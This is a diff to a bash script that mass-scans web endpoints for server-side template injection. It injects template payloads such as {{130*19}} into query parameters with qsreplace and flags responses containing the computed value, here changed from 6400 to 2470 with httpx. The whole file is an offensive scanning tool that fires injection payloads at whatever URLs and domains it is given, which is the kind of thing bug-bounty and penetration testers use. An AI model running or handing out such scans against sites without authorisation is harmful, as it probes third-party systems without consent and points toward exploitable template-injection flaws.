@@ -1,6 +1,6 @@
 #!/bin/bash
 #install uro qsreplace httpx anew
-#./ssti url_endpoint.txt payload.txt http_domians.txt path_with_slash.txt
+#./ssti url_endpoint.txt payload.txt{{130*19}} http_domians.txt path_with_slash.txt/{{130*19}}
 
 domain=$1
 url=$2
@@ -12,6 +12,6 @@ cat $url |while read d;do cat $1|uro|grep '='| qsreplace $d|python3 -c "import s
 cat $url |while read d;do cat $1|uro|grep '='| qsreplace $d|anew>> ssti.txt;done
 
 cat ssti.txt | httpx -x GET,POST -mr 888888 -silent | tee -a ssti_vul88888.txt
-cat ssti.txt | httpx -x GET,POST -mr 6400 -silent | tee -a ssti_vul6400.txt
-cat $3 | httpx -x GET,POST -mr '/6400' -silent -path $4 | tee -a ssti_only_domain.com_6400.txt
+cat ssti.txt | httpx -x GET,POST -mr 2470 -silent | tee -a ssti_vul6400.txt
+cat $3 | httpx -x GET,POST -mr '/2470' -silent -path $4 | tee -a ssti_only_domain.com_6400.txt
 cat $3 | httpx -x GET,POST -mr '/888888' -silent -path $4 | tee -a ssti_only_domain.com_88888.txt
